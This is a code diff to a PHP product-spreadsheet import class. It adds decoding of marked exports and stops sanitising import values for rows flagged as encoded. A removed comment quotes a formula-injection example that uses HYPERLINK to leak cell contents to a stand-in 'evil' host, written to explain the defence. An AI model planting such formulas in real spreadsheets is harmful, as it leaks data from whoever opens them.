@@ -13,6 +13,8 @@ use App\Models\User;
 use App\Services\ProductLocationStockService;
 use App\Services\ProductService;
 use App\Support\ProductCurrencyColumns;
+use App\Support\ProductSpreadsheetText;
+use App\Support\ProductSpreadsheetValueBinder;
 use App\Support\SpreadsheetSafety;
 use Illuminate\Database\QueryException;
 use Illuminate\Support\Arr;
@@ -20,11 +22,15 @@ use Illuminate\Support\Collection;
 use Illuminate\Support\Facades\DB;
 use Illuminate\Support\Facades\Log;
 use Illuminate\Support\Facades\Validator;
+use InvalidArgumentException;
 use Maatwebsite\Excel\Concerns\SkipsFailures;
 use Maatwebsite\Excel\Concerns\SkipsOnFailure;
 use Maatwebsite\Excel\Concerns\ToCollection;
 use Maatwebsite\Excel\Concerns\WithChunkReading;
+use Maatwebsite\Excel\Concerns\WithCustomValueBinder;
+use Maatwebsite\Excel\Concerns\WithEvents;
 use Maatwebsite\Excel\Concerns\WithHeadingRow;
+use Maatwebsite\Excel\Events\BeforeImport;
 
 /**
  * Import class for processing product data from Excel files.
@@ -32,7 +38,7 @@ use Maatwebsite\Excel\Concerns\WithHeadingRow;
  * Handles importing and updating products from spreadsheet data,
  * including automatic creation of categories and locations.
  */
-final class ProductsImport implements SkipsOnFailure, ToCollection, WithChunkReading, WithHeadingRow
+final class ProductsImport extends ProductSpreadsheetValueBinder implements SkipsOnFailure, ToCollection, WithChunkReading, WithCustomValueBinder, WithEvents, WithHeadingRow
 {
     use SkipsFailures;
 
@@ -152,6 +158,18 @@ final class ProductsImport implements SkipsOnFailure, ToCollection, WithChunkRea
         });
     }
 
+    public function registerEvents(): array
+    {
+        return [BeforeImport::class => [$this, 'configureTextReader']];
+    }
+
+    public function configureTextReader(BeforeImport $event): void
+    {
+        // XLSX readers set values explicitly; their workbook binder must be
+        // configured before loading, including when the file is chunked.
+        $event->reader->getPhpSpreadsheetReader()->setValueBinder($this);
+    }
+
     public function collection(Collection $rows): void
     {
         foreach ($rows as $index => $row) {
@@ -160,6 +178,9 @@ final class ProductsImport implements SkipsOnFailure, ToCollection, WithChunkRea
             $rowNumber = $this->rowOffset + $index + 2;
 
             try {
+                $row = clone $row;
+                ProductSpreadsheetText::decodeRow($row);
+
                 // Validate the row
                 $currencyColumns = $this->currencyColumns($row->keys()->all(), $rowNumber);
 
@@ -196,6 +217,13 @@ final class ProductsImport implements SkipsOnFailure, ToCollection, WithChunkRea
                 // and warn, rather than silently letting a later row overwrite
                 // the product created earlier in the same file.
                 $sku = (string) $row['sku'];
+                if (! ProductSpreadsheetText::isEncoded($row) && str_starts_with($sku, "'")
+                    && SpreadsheetSafety::neutralise(substr($sku, 1)) === $sku
+                    && ! Product::withTrashed()->where('organization_id', $this->organizationId)->where('sku', $sku)->exists()
+                    && Product::withTrashed()->where('organization_id', $this->organizationId)->where('sku', substr($sku, 1))->exists()) {
+                    throw new InvalidArgumentException('This SKU is ambiguous with an escaped value from an older export. Export the products again and retain the Inventoros Text Encoding column.');
+                }
+
                 if (isset($this->seenSkus[$sku])) {
                     $this->warnings[] = [
                         'row' => $rowNumber,
@@ -286,12 +314,10 @@ final class ProductsImport implements SkipsOnFailure, ToCollection, WithChunkRea
         $status = $row['status'] ?? 'active';
         $isActive = strtolower($status) === 'active';
 
-        // Strip leading formula triggers from imported strings so
-        // a tenant-uploaded row that says
-        //   name = =HYPERLINK("https://evil/?leak="&A2,"safe")
-        // doesn't land in the DB and re-export to a downloader
-        // whose spreadsheet viewer evaluates it.
-        $sanitise = fn ($v) => SpreadsheetSafety::sanitiseImport($v);
+        // Marked exports have already been decoded without losing literal
+        // identifiers. Every subsequent export still escapes formula cells.
+        // Unmarked third-party files retain their existing input sanitization.
+        $sanitise = fn ($value) => ProductSpreadsheetText::isEncoded($row) ? $value : SpreadsheetSafety::sanitiseImport($value);
 
         $productData = [
             'name' => $sanitise($row['name']),
@@ -352,9 +378,10 @@ final class ProductsImport implements SkipsOnFailure, ToCollection, WithChunkRea
      */
     protected function applyPrimarySupplier(Product $product, $row, int $rowNumber): void
     {
-        $code = trim((string) ($row['supplier_code'] ?? ''));
-        $name = trim((string) ($row['supplier_name'] ?? ''));
-        $sku = trim((string) ($row['supplier_sku'] ?? ''));
+        $text = fn ($value) => ProductSpreadsheetText::isEncoded($row) ? (string) $value : trim((string) $value);
+        $code = $text($row['supplier_code'] ?? '');
+        $name = $text($row['supplier_name'] ?? '');
+        $sku = $text($row['supplier_sku'] ?? '');
         $cost = trim((string) ($row['supplier_cost'] ?? ''));
 
         if ($code === '' && $name === '') {
@@ -394,7 +421,7 @@ final class ProductsImport implements SkipsOnFailure, ToCollection, WithChunkRea
         }
 
         app(ProductService::class)->setPrimarySupplier($product, $supplier->id, [
-            'supplier_sku' => $sku !== '' ? mb_substr((string) SpreadsheetSafety::sanitiseImport($sku), 0, 255) : null,
+            'supplier_sku' => $sku !== '' ? mb_substr((string) (ProductSpreadsheetText::isEncoded($row) ? $sku : SpreadsheetSafety::sanitiseImport($sku)), 0, 255) : null,
             'cost_price' => $costPrice,
         ]);
     }
